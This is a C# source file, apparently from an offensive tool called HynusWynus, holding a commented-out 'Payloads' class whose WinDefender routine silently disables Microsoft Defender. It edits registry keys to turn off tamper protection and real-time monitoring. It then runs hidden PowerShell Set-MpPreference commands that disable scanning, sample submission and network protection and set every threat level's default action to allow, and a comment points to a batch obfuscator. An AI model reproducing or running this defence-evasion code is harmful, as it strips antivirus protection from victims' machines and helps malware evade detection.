using HynusWynus.Classes;
using Microsoft.Win32;
using Spectre.Console;
using System.Diagnostics;
using System.Security.Principal;

namespace HynusWynus;

/*
 * Tools:
 *  batch obfuscator: https://batch-obfuscator.tk/
 *  PS1 obfuscator:   
 */

//public class Payloads : Program
//{
//    public static string PEASS = "";
//    public class WinDefender
//    {
//        public static void Launch()
//        {
//            if (!OperatingSystem.IsWindows())
//            {
//                AnsiConsole.Write("\r\nHow are you running this on a machine without Windows...?\r\n");
//                Environment.Exit(420);
//            }
//            else if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
//            {
//                Logging.LogError("Unable to disable Windows Defender : Access Denied (Admin required)");
//                return;
//            }
//
//            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
//            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
//            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
//            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
//            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
//
//            CheckDefender();
//        }
//
//        private static void RegistryEdit(string regPath, string name, string value)
//        {
//            try
//            {
//                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
//                {
//                    if (key == null)
//                    {
//                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
//                        return;
//                    }
//                    if (key.GetValue(name) != (object)value)
//                        key.SetValue(name, value, RegistryValueKind.DWord);
//                }
//            }
//            catch (Exception e)
//            {
//                Logging.WriteException("Failed to edit registry: ", e);
//            }
//        }
//
//        private static void CheckDefender()
//        {
//            Process proc = new Process
//            {
//                StartInfo = new ProcessStartInfo
//                {
//                    FileName = "powershell",
//                    Arguments = "Get-MpPreference -verbose",
//                    UseShellExecute = false,
//                    RedirectStandardOutput = true,
//                    WindowStyle = ProcessWindowStyle.Hidden,
//                    CreateNoWindow = true
//                }
//            };
//            proc.Start();
//            while (!proc.StandardOutput.EndOfStream)
//            {
//                string line = proc.StandardOutput.ReadLine();
//
//                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection
//
//                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring
//
//                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
//
//                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments
//
//                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history
//
//                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup
//
//                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files
//
//                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 
//
//                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
//                    RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans
//
//                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
//                    RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 
//
//                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
//                    RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 
//
//                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
//                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow
//
//                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
//                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat
//
//                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
//                    RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat
//
//                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
//                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
//            }
//        }
//
//        private static void RunPS(string args)
//        {
//            Process proc = new Process
//            {
//                StartInfo = new ProcessStartInfo
//                {
//                    FileName = "powershell",
//                    Arguments = args,
//                    WindowStyle = ProcessWindowStyle.Hidden,
//                    CreateNoWindow = true
//                }
//            };
//            proc.Start();
//        }
//    }
//}